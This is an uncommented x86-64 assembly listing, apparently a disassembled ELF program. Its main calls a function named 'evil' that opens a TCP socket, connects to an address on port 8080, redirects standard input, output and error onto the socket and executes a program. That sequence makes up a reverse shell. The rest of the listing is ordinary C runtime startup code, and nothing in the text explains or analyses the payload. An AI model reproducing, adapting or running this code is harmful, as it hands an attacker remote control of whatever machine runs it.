_init:
        sub     rsp, 8                                  
        mov     rax, qword [rel .L36]                  
        test    rax, rax                                
        jz      .L01                                   
        call    rax                                     
.L01:
        add     rsp, 8                                  
        ret                                             
_start:
        xor     ebp, ebp                                
        mov     r9, rdx                                 
        pop     rsi                                     
        mov     rdx, rsp                                
        and     rsp, 0FFFFFFFFFFFFFFF0H                 
        push    rax                                     
        push    rsp                                     
        lea     r8, [rel __libc_csu_fini]               
        lea     rcx, [rel __libc_csu_init]              
        lea     rdi, [rel main]                         
        call    near [rel .L35]                        
        hlt                                             
deregister_tm_clones:
        lea     rdi, [rel _edata]                       
        push    rbp                                     
        lea     rax, [rel _edata]                       
        cmp     rax, rdi                                
        mov     rbp, rsp                                
        jz      .L12                                   
        mov     rax, qword [rel .L34]                  
        test    rax, rax                                
        jz      .L12                                   
        pop     rbp                                     
        jmp     rax                                     
.L12:
        pop     rbp                                     
        ret                                             
register_tm_clones:
        lea     rdi, [rel _edata]                       
        lea     rsi, [rel _edata]                       
        push    rbp                                     
        sub     rsi, rdi                                
        mov     rbp, rsp                                
        sar     rsi, 3                                  
        mov     rax, rsi                                
        shr     rax, 63                                 
        add     rsi, rax                                
        sar     rsi, 1                                  
        jz      .L13                                   
        mov     rax, qword [rel .L37]                  
        test    rax, rax                                
        jz      .L13                                   
        pop     rbp                                     
        jmp     rax                                     
.L13:
        pop     rbp                                     
        ret                                             
        cmp     byte [rel _edata], 0                    
        jnz     .L15                                   
        cmp     qword [rel .L38], 0                    
        push    rbp                                     
        mov     rbp, rsp                                
        jz      .L14                                   
        mov     rdi, qword [rel __dso_handle]           
        call    .L11                                   
.L14:
        call    deregister_tm_clones                    
        mov     byte [rel _edata], 1                    
        pop     rbp                                     
        ret                                             
.L15:
        DB      0F3H                                    
        ret                                             
frame_dummy:
        push    rbp                                     
        mov     rbp, rsp                                
        pop     rbp                                     
        jmp     register_tm_clones                      
evil:
        push    rbp                                     
        mov     rbp, rsp                                
        sub     rsp, 48                                 
        mov     rax, qword [fs:abs 28H]                 
        mov     qword [rbp-8H], rax                     
        xor     eax, eax                                
        mov     word [rbp-20H], 2                       
        lea     rdi, [rel .L19]                        
        call    .L07                                   
        mov     dword [rbp-1CH], eax                    
        mov     edi, 8080                               
        call    .L05                                   
        mov     word [rbp-1EH], ax                      
        mov     edx, 0                                  
        mov     esi, 1                                  
        mov     edi, 2                                  
        call    .L10                                   
        mov     dword [rbp-24H], eax                    
        lea     rcx, [rbp-20H]                          
        mov     eax, dword [rbp-24H]                    
        mov     edx, 16                                 
        mov     rsi, rcx                                
        mov     edi, eax                                
        call    .L08                                   
        mov     eax, dword [rbp-24H]                    
        mov     esi, 0                                  
        mov     edi, eax                                
        call    .L06                                   
        mov     eax, dword [rbp-24H]                    
        mov     esi, 1                                  
        mov     edi, eax                                
        call    .L06                                   
        mov     eax, dword [rbp-24H]                    
        mov     esi, 2                                  
        mov     edi, eax                                
        call    .L06                                   
        mov     r8d, 0                                  
        mov     ecx, 0                                  
        lea     rdx, [rel .L20]                        
        lea     rsi, [rel .L21]                        
        lea     rdi, [rel .L22]                        
        mov     eax, 0                                  
        call    .L09                                   
        nop                                             
        mov     rax, qword [rbp-8H]                     
        xor     rax, qword [fs:abs 28H]                 
        jz      .L16                                   
        call    .L04                                   
.L16:
        leave                                           
        ret                                             
main:
        push    rbp                                     
        mov     rbp, rsp                                
        lea     rdi, [rel .L23]                        
        call    .L03                                   
        mov     eax, 0                                  
        call    evil                                    
        mov     eax, 0                                  
        pop     rbp                                     
        ret                                             
__libc_csu_init:
        push    r15                                     
        push    r14                                     
        mov     r15, rdx                                
        push    r13                                     
        push    r12                                     
        lea     r12, [rel __frame_dummy_init_array_entry]
        push    rbp                                     
        push    rbx                                     
        mov     r13d, edi                               
        mov     r14, rsi                                
        sub     rbp, r12                                
        sub     rsp, 8                                  
        sar     rbp, 3                                  
        call    _init                                   
        test    rbp, rbp                                
        jz      .L18                                   
        xor     ebx, ebx                                
.L17:
        mov     rdx, r15                                
        mov     rsi, r14                                
        mov     edi, r13d                               
        call    near [r12+rbx*8]                        
        add     rbx, 1                                  
        cmp     rbp, rbx                                
        jnz     .L17                                   
.L18:
        add     rsp, 8                                  
        pop     rbx                                     
        pop     rbp                                     
        pop     r12                                     
        pop     r13                                     
        pop     r14                                     
        pop     r15                                     
        ret                                             
        nop                                             
__libc_csu_fini:
        DB      0F3H                                    
        ret                                             
_fini:
        sub     rsp, 8                                  
        add     rsp, 8                                  
        ret                                             